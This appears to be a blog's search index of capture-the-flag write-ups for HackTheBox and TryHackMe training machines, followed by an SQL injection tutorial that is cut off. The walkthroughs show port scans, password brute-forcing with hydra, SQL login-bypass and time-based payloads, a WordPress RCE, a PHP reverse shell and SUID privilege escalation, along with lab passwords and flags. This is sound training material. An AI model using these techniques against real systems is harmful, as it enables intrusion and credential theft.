<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Dancing</title>
      <link href="/2024/05/03/Dancing/"/>
      <url>/2024/05/03/Dancing/</url>
      
        <content type="html"><![CDATA[<p><img src="/../dancing_images/ce52eadd09ff5a28a1eea8c65d6683a9.png" alt="alt text"></p><h1 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h1><p>Machine IP : 10.129.26.54</p><p>NMAP Scanning :</p><p>sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.129.26.54</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.34.png" alt="alt text"></p><p>-p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669</p><p>Full NMAP Scanning: </p><p>nmap -A -sC -sV -p135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.129.26.54 -Pn</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.45.png" alt="alt text"></p><p>smbclient</p><p>smbclient -L \\10.129.26.54\public </p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.29.55.png" alt="alt text"></p><p>Access <code>WorkShares</code> without a password:</p><p>smbclient &#x2F;&#x2F;10.129.26.54&#x2F;WorkShares -U ANONYMOUS</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.07.png" alt="alt text"></p><p>Go into James.P</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.15.png" alt="alt text"></p><p>get flag.txt</p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.24.png" alt="alt text"></p><p><img src="/../dancing_images/Screenshot%202024-05-03%20at%2022.30.32.png" alt="alt text"></p><p>Flag: 5f61c10dffbc77a704d76016a22f1664</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fawn</title>
      <link href="/2024/05/03/fawn/"/>
      <url>/2024/05/03/fawn/</url>
      
        <content type="html"><![CDATA[<p><img src="/../fawn_images/b64f85071e626e4cc2272d54332e4131.webp" alt="alt text"></p><h1 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h1><p>Machine IP : 10.129.159.51</p><p>NMAP Scanning :</p><p>sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.129.159.51</p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.19.19.png" alt="alt text"></p><p>Port 21 (ftp) opened </p><p>Connect to ftp with the username <code>anonymous</code> to log in anonymously :</p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.29.png" alt="alt text"></p><p><code>ls -la</code></p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.43.png" alt="alt text"></p><p><code>get flag.txt</code></p><p><img src="/../fawn_images/Screenshot%202024-05-03%20at%2022.21.50.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic Pentesting</title>
      <link href="/2024/04/23/Basic-Pentesting/"/>
      <url>/2024/04/23/Basic-Pentesting/</url>
      
        <content type="html"><![CDATA[<p><img src="/../bpentesting_img/Basic-Pentesting.png.webp" alt="alt text"></p><p>Room Link: <a href="https://tryhackme.com/r/room/basicpentestingjt">https://tryhackme.com/r/room/basicpentestingjt</a></p><h1 id="Basic-Pentesting"><a href="#Basic-Pentesting" class="headerlink" title="Basic Pentesting"></a>Basic Pentesting</h1><p>NMAP Scanning : (sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.10.25.177 | tee nmap&#x2F;10.10.25.177_nmap.txt)</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.14.25.png" alt="alt text"></p><p>PORT     STATE SERVICE      REASON<br>22&#x2F;tcp   open  ssh          syn-ack ttl 63<br>80&#x2F;tcp   open  http         syn-ack ttl 63<br>139&#x2F;tcp  open  netbios-ssn  syn-ack ttl 63<br>445&#x2F;tcp  open  microsoft-ds syn-ack ttl 63<br>8009&#x2F;tcp open  ajp13        syn-ack ttl 63<br>8080&#x2F;tcp open  http-proxy   syn-ack ttl 63</p><p>Full NMAP Scanning :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;basicpentesting]<br>└─$ nmap -A -sC -sV -p22,80,139,445,8009,8080 10.10.25.177 -Pn</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.15.54.png" alt="alt text"></p><p>Directory busting :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;basicpentesting]<br>└─$ gobuster dir -u <a href="http://10.10.25.177/">http://10.10.25.177</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.09.png" alt="alt text"></p><p>Found <code>/development</code> </p><p>Let’s check the website and port 8080</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.20.png" alt="alt text"></p><p>Blank page in maintenance , check for port 8080</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.27.png" alt="alt text"></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.36.png" alt="alt text"></p><p>Try random credentials in Manager app </p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.16.51.png" alt="alt text"></p><p>Hit sign in, nothing happens,  hit cancel and we get this :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.17.03.png" alt="alt text"></p><p>Let’s try another directory busting attack for the 8080 port :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;basicpentesting]<br>└─$ gobuster dir -u <a href="http://10.10.25.177:8080/">http://10.10.25.177:8080</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.27.05.png" alt="alt text"></p><p>We found nothing..</p><p>Log in anonymous with smb:</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;basicpentesting]<br>└─$ smbclient \\10.10.25.177\anonymous</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.17.48.png" alt="alt text"></p><p>Found a username : <code>Jan</code></p><p>Bruteforcing with Hydra :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;basicpentesting]<br>└─$ hydra -l jan -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 10.10.25.177 ssh</p><p>After about 5 minutes we find the password :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.00.png" alt="alt text"></p><p>Password :<code>armando</code> </p><p>Now we succesfully logged in as jan with ssh :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.09.png" alt="alt text"></p><p>Now we need to escalate privileges  and get kay’s password, for that we’ll be using linpeas :</p><ul><li><a href="https://linpeas.sh/">https://linpeas.sh/</a></li></ul><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.19.png" alt="alt text"></p><p>Copied linpeas to the ssh session and made it executable with <code>chmod +x</code></p><p>Run it </p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.30.png" alt="alt text"></p><p>Found an id_rsa of kay , create a new file with the name <code>kay_id_rsa</code></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.18.56.png" alt="alt text"></p><p>As it tells us the password is protected so we’ll use JohnTheRipper to crack it:</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;basicpentesting]<br>└─$ john kay_id_rsa –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.04.png" alt="alt text"></p><p>Now we will go back to jan’s ssh session and run this:</p><p>ssh -i &#x2F;home&#x2F;kay&#x2F;.ssh&#x2F;id_rsa <a href="mailto:&#x6b;&#x61;&#121;&#64;&#49;&#48;&#46;&#x31;&#48;&#x2e;&#x32;&#x35;&#46;&#49;&#55;&#x37;">&#x6b;&#x61;&#121;&#64;&#49;&#48;&#46;&#x31;&#48;&#x2e;&#x32;&#x35;&#46;&#49;&#55;&#x37;</a></p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.13.png" alt="alt text"></p><p>It asks us to give the passphrase and we have it <code>beeswax</code></p><p>Get the flag :</p><p><img src="/../bpentesting_img/Screenshot%202024-04-23%20at%2018.19.23.png" alt="alt text"></p><p>Flag : <code>heresareallystrongpasswordthatfollowsthepasswordpolicy$$</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog</title>
      <link href="/2024/04/22/Blog/"/>
      <url>/2024/04/22/Blog/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blog_images/wordpress-581849_1280.webp" alt="alt text"></p><p>Room Link: <a href="https://tryhackme.com/r/room/blog">https://tryhackme.com/r/room/blog</a></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Firstly we need to add the IP Address to <code>/etc/hosts</code> </p><p><code>sudo nano /etc/hosts</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.23.png" alt="alt text"></p><p>NMAP Scanning :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Blog]<br>└─$ sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.10.155.138</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.06.png" alt="alt text"></p><p>FULL NMAP Scanning : </p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Blog]<br>└─$ sudo nmap -A -sC -sV -p80,445,22,139 10.10.155.138 -Pn</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.15.png" alt="alt text"></p><p>Let’s check smb :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.44.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.53.54.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2017.19.50.png" alt="alt text"><br>These seem like some images .jpg non interesting.</p><p>Directory Busting :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Blog]<br>└─$ gobuster dir -u <a href="http://10.10.155.138/">http://10.10.155.138</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.11.png" alt="alt text"></p><p>Gobuster found some interesting directories, check for <code>/rss</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.19.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.25.png" alt="alt text"></p><p>Seems like a XML File with the site:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.31.png" alt="alt text"></p><p><code>/atom</code> downloaded us another file </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.40.png" alt="alt text"></p><p>Let’s check out &#x2F;login </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.49.png" alt="alt text"></p><p>Since we have Wordpress we can use WPScan:</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Blog]<br>└─$ wpscan –url <a href="http://blog.thm/">http://blog.thm</a> –enumerate ap,dbe,cb,u –detection-mode aggressive</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.54.56.png" alt="alt text"></p><p>Found 2 users : </p><ul><li>bjoel          (Billy Joel)</li><li>kwheel      (Karen Wheelerr)</li></ul><p>Performing bruteforce on both users :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.06.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.12.png" alt="alt text"></p><p>Found a password for kwheel:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.19.png" alt="alt text"></p><p>Password : <code>cutiepie1</code> </p><p>Log in with the credentials found :</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.30.png" alt="alt text"></p><p>We know the web application is running wordpress 5.0 which has a known Remote Code Execution vulnerability: </p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.37.png" alt="alt text"></p><p><a href="https://www.exploit-db.com/exploits/46662">https://www.exploit-db.com/exploits/46662</a></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>msfconsole</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.46.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.55.55.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.02.png" alt="alt text"></p><p>Spawning <code>/bin/bash</code> using python:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.09.png" alt="alt text"></p><p>Finding SUID Binaries :</p><p><code>www-data@blog:/var/www/wordpress$ find / -type f -perm -u=s 2&gt;/dev/null</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.16.png" alt="alt text"></p><p>If we try to run that we get that we are not an admin:</p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.21.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.26.png" alt="alt text"></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.32.png" alt="alt text"></p><p>Found first flag :</p><p><code>c8421899aae571f7af486492b71a8ab7</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.39.png" alt="alt text"></p><p>Found second flag :</p><p><code>9a0b2b618bef9bfa7ac28c1353d9f318</code></p><p><img src="/../blog_images/Screenshot%202024-04-22%20at%2016.56.46.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lesson Learned?</title>
      <link href="/2024/04/19/LessonLearned/"/>
      <url>/2024/04/19/LessonLearned/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/maxresdefault.jpg" alt="alt text"></p><p>Room link : <a href="https://tryhackme.com/r/room/lessonlearned">https://tryhackme.com/r/room/lessonlearned</a></p><h1 id="Lesson-Learned"><a href="#Lesson-Learned" class="headerlink" title="Lesson Learned?"></a>Lesson Learned?</h1><p>IP Address  :(10.10.63.208)</p><p>We have a web application with a Login form :</p><p><img src="/../images/a1.png" alt="alt text"></p><p>Let’s try a default XSS :</p><p><img src="/../images/a2.png" alt="alt text"></p><p>Not working , robots txt maybe?</p><p><img src="/../images/a3.png" alt="alt text"></p><p>Nope.</p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Lesson_Learned?]<br>└─$ sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.10.63.208</p><p><img src="/../images/a4.png" alt="alt text"></p><p>Ports open : </p><ul><li>22 ssh</li><li>80 http</li></ul><p>Full NMAP Scanning :</p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Lesson_Learned?]<br>└─$ nmap -A -sC -sV -p80,22 10.10.55.21 -Pn</p><p><img src="/../images/a5.png" alt="alt text"></p><h3 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h3><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;Lesson_Learned?]<br>└─$ gobuster dir -u <a href="http://10.10.63.208/">http://10.10.63.208</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt</p><p><img src="/../images/a6.png" alt="alt text"></p><p>Found &#x2F;manual  but there’s nothing</p><p><img src="/../images/a7.png" alt="alt text"></p><p>Let’s try to bypass the Login with an SQL Payload :</p><p><img src="/../images/a8.png" alt="alt text"></p><p><img src="/../images/a9.png" alt="alt text"></p><p>Here we got a hint that tells us we should use a <code>less destructive</code> payload :</p><p><img src="/../images/a10.png" alt="alt text"></p><p>We have a lot of payloads here : <a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></p><p>Let’s reset the machine and try another SQL payload to bypass the login .. didn’t find anything, try to bruteforce the username with hydra :</p><p>┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;Workspace&#x2F;TryHackMe]<br>└─$ hydra -L &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;Workspace&#x2F;TryHackMe&#x2F;SecLists&#x2F;Usernames&#x2F;xato-net-10-million-usernames.txt -p asd 10.10.93.0 http-post-form   “&#x2F;:username&#x3D;^USER^&amp;password&#x3D;^PASS^: Invalid username and password.”</p><p><img src="/../images/a11.png" alt="alt text"></p><p>Ater trying this payload <code>admin’ AND 1=1#</code> with all the usernames finally one worked </p><p><code>martin&#39; AND 1=1#</code></p><p><img src="/../images/a11.png" alt="alt text"></p><p><img src="/../images/a12.png" alt="alt text"></p><p><img src="/../images/a13.png" alt="alt text"></p><p>So we found the flag!</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mr Robot</title>
      <link href="/2024/04/16/MrRobot/"/>
      <url>/2024/04/16/MrRobot/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/mrrobot.jpg" alt="alt text"></p><h3 id="Head-into-the-IP-Address-given"><a href="#Head-into-the-IP-Address-given" class="headerlink" title="Head into the IP Address given :"></a>Head into the IP Address given :</h3><p>10.10.50.127</p><p><img src="/../images/1.png" alt="alt text"></p><p>After trying all those commands , i didn’t find anything interesting . First thing i got in my mind is to go and see if we find something in <code>/robots.txt</code> :</p><p><img src="/../images/2.png" alt="alt text"></p><p>We find <code>key-1-of-3.txt</code> let’s head into that :</p><p>We got the flag : <code>073403c8a58a1f80d943455fb30724b9</code></p><p>Let’s see <code>fsociety.dic</code> aswell :</p><p><img src="/../images/3.png" alt="alt text"></p><p><img src="/../images/4.png" alt="alt text"></p><p>It seems like this is a list of passwords. </p><h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h3><p><code>( sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.50.127 )</code></p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;mrrobot]<br>└─$  sudo nmap -p- -sS –min-rate 5000 –open -T5 -vvv -Pn 10.10.50.127<br>[sudo] password for kali:<br>Host discovery disabled (-Pn). All addresses will be marked ‘up’ and scan times may be slower.<br>Starting Nmap 7.94SVN ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2024-04-16 14:00 EDT<br>Initiating Parallel DNS resolution of 1 host. at 14:00<br>Completed Parallel DNS resolution of 1 host. at 14:00, 0.04s elapsed<br>DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]<br>Initiating SYN Stealth Scan at 14:00<br>Scanning 10.10.50.127 [65535 ports]<br>Discovered open port 443&#x2F;tcp on 10.10.50.127<br>Discovered open port 80&#x2F;tcp on 10.10.50.127<br>Completed SYN Stealth Scan at 14:00, 26.58s elapsed (65535 total ports)<br>Nmap scan report for 10.10.50.127<br>Host is up, received user-set (0.086s latency).<br>Scanned at 2024-04-16 14:00:06 EDT for 27s<br>Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)<br>Some closed ports may be reported as filtered due to –defeat-rst-ratelimit<br>PORT    STATE SERVICE REASON<br>80&#x2F;tcp  open  http    syn-ack ttl 63<br>443&#x2F;tcp open  https   syn-ack ttl 63</p><p>Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap<br>Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds<br>           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (964B</p><p><strong>Full NMAP Scanning :</strong> </p><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;mrrobot]<br>└─$ nmap -A -sC -sV -p80,443 10.10.50.127 -Pn<br>Starting Nmap 7.94SVN ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2024-04-16 14:07 EDT<br>Nmap scan report for 10.10.50.127<br>Host is up (0.063s latency).</p><p>PORT    STATE SERVICE  VERSION<br>80&#x2F;tcp  open  http     Apache httpd<br>|_http-server-header: Apache<br>|_http-title: Site doesn’t have a title (text&#x2F;html).<br>443&#x2F;tcp open  ssl&#x2F;http Apache httpd<br>| ssl-cert: Subject: commonName&#x3D;<a href="http://www.example.com/">www.example.com</a><br>| Not valid before: 2015-09-16T10:45:03<br>|_Not valid after:  2025-09-13T10:45:03<br>|_http-title: Site doesn’t have a title (text&#x2F;html).<br>|_http-server-header: Apache</p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.77 seconds</p><h3 id="Directory-busting"><a href="#Directory-busting" class="headerlink" title="Directory busting :"></a>Directory busting :</h3><p>┌──(kali㉿kali)-[~&#x2F;…&#x2F;Workspace&#x2F;TryHackMe&#x2F;Boxes&#x2F;mrrobot]<br>└─$ gobuster dir -u <a href="http://10.10.50.127/">http://10.10.50.127</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-lowercase-2.3-medium.txt</p><p><img src="/../images/5.png" alt="alt text"></p><p>First interesting subdomain for me is <code>wp-admin</code> let’s go there :</p><p>Found a Wordpress login :</p><p><img src="/../images/6.png" alt="alt text"></p><p>Tried default admin and password but unfortunately it didnt work . </p><h3 id="Bruteforce-the-username"><a href="#Bruteforce-the-username" class="headerlink" title="Bruteforce the username"></a>Bruteforce the username</h3><p>Open Burpsuite and foxy proxy → Intercept ON → write a random username and pass and hit log in  → Burp intercepts it → Send to Intruder → Add payload to the username → Payloads → Load the list we got <code>fsociety.dic</code> → Check for a username with different length :</p><p><img src="/../images/7.png" alt="alt text"></p><p>If we try a password with the username <code>Elliot</code> the error changes , that tells us the username Elliot is correct :</p><p><img src="/../images/8.png" alt="alt text"></p><p>Let’s head into <code>/license</code> :</p><p><img src="/../images/license.png" alt="alt text"></p><p>Inspect(Q)</p><p><img src="/../images/9.png" alt="alt text"></p><p><img src="/../images/10.png" alt="alt text"></p><p>Username : elliot</p><p>Password : ER28-0652</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>To get shell access we need to paste a php reverse shell into Editor Header:</p><p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p><p><img src="/../images/11.png" alt="alt text"></p><p><img src="/../images/12.png" alt="alt text"></p><p>Spawning &#x2F;bin&#x2F;bash using python :</p><p><img src="/../images/13.png" alt="alt text"></p><p>Found a user <code>robot</code> </p><p><img src="/../images/14.png" alt="alt text"></p><p>Crack the hash using <code>Crackstation</code> :</p><p><img src="/../images/15.png" alt="alt text"></p><p>We found <code>robot&#39;s</code> password let’s switch user now </p><p><img src="/../images/16.png" alt="alt text"></p><p><img src="/../images/17.png" alt="alt text"></p><p>Key 2 : <code>abcdefghijklmnopqrstuvwxyz</code></p><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p><code>sudo -l</code></p><p><img src="/../images/18.png" alt="alt text"></p><p><strong>Finding SUID Binaries:</strong></p><p>robot@linux:~$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/../images/19.png" alt="alt text"></p><p>Found nmap , let’s go to GTFOBins</p><p><img src="/../images/20.png" alt="alt text"></p><p>Let’s chose option B because its shorter :</p><p><img src="/../images/21.png" alt="alt text"></p><p>Found key 3 : <code>04787ddef27c3dee1ee161b21670b4e4</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2024/04/10/SQL/"/>
      <url>/2024/04/10/SQL/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/SQLi.webp" alt="alt text"></p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL injection (SQLi) is a web application injection vulnerability that occurs when an attacker injects malicious SQL statements into an application’s input fields.</p><p>This occurs when a web application does not properly validate user input, allowing an attacker to inject SQL code&#x2F;queries that can manipulate the database or gain access to sensitive information.</p><p>For example, suppose a website has a login form that accepts a username and password. If the website does not properly validate the user’s input, an attacker could enter a malicious SQL statement into the username field that would allow them to bypass the login process and gain access to the website’s database.</p><p>What damage can it do ? </p><p>SQL injection attacks can have serious consequences, including the theft of sensitive data, unauthorized access to sensitive systems, and even full system compromise.</p><h3 id="Types-of-SQL-Injection"><a href="#Types-of-SQL-Injection" class="headerlink" title="Types of SQL Injection:"></a>Types of SQL Injection:</h3><p>SQL injection attacks can manifest in various forms, depending on the specific vulnerability and the attacker’s goals. Some common types of SQL injection include:</p><ol><li><p><code>Classic SQL Injection</code>: In classic SQL injection, attackers insert malicious SQL statements into input fields, such as login forms or search boxes, to manipulate the database. This can involve altering the logic of the original query, extracting sensitive information, or even modifying or deleting database records.</p></li><li><p><code>Blind SQL Injection</code>: In blind SQL injection, attackers exploit vulnerabilities without directly viewing the results of their actions. Instead, they rely on the application’s behavior to infer information indirectly. This can involve techniques like time-based blind injection or boolean-based blind injection.</p></li><li><p><code>Error-based SQL Injection</code>: Error-based SQL injection exploits error messages generated by the database server to extract information about the database structure or the data itself. Attackers inject SQL code that triggers errors revealing details they can exploit.</p></li><li><p><code>Union-based SQL Injection</code>: Union-based SQL injection involves injecting a SELECT statement that includes a UNION operator into an SQL query to combine the results of two queries. This technique can be used to extract data from other tables or even execute arbitrary SQL commands.</p></li><li><p><code>Out-of-Band SQL Injection</code>: Out-of-band SQL injection leverages features of the database server to communicate with the attacker’s server and transmit data. This can be useful when direct retrieval of data is not possible due to network restrictions or other security measures.</p></li><li><p><code>Time-based SQL Injection</code>: Time-based SQL injection involves injecting SQL queries that cause the server to delay its response. Attackers can exploit this delay to infer information indirectly, such as determining whether a certain condition is true or false.</p></li></ol><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples:"></a>Examples:</h2><h3 id="Classic-SQL-Injection"><a href="#Classic-SQL-Injection" class="headerlink" title="Classic SQL Injection:"></a>Classic SQL Injection:</h3><p>Imagine a login form where users input their username and password. An attacker might input ‘ OR 1&#x3D;1 – in the username field. If the application doesn’t properly sanitize inputs, the SQL query might become:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'input_password';</div><p>This query always returns true, allowing the attacker to log in without a valid password.</p><h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection:"></a>Blind SQL Injection:</h3><p>Suppose there’s a login form on a website where users enter their username and password. The website’s login process checks the entered credentials against a database using an SQL query like this:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';</div><p>Now, let’s say an attacker wants to bypass the login and gain unauthorized access to the website’s backend. They notice that the website is vulnerable to Blind SQL Injection. Instead of directly viewing the results of their injected SQL queries, the attacker will rely on the application’s behavior to infer information indirectly.</p><p>The attacker inputs the following string into the username field of the login form:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">' AND SLEEP(10) --'</div><p>If the website takes significantly longer to respond, the attacker infers that the injected condition was true.</p><p>This input modifies the SQL query executed by the application to become:</p><div style="background-color: ##28282B; padding: 10px; border: 1px solid #ccc;">SELECT * FROM users WHERE username = '' OR SLEEP(10) -- ' AND password = 'input_password';</div><h3 id="Error-based-SQL-Injection"><a href="#Error-based-SQL-Injection" class="headerlink" title="Error-based SQL Injection:"></a>Error-based SQL Injection:</h3><p>Consider a website that shows a detailed error message when encountering a database error. An attacker might 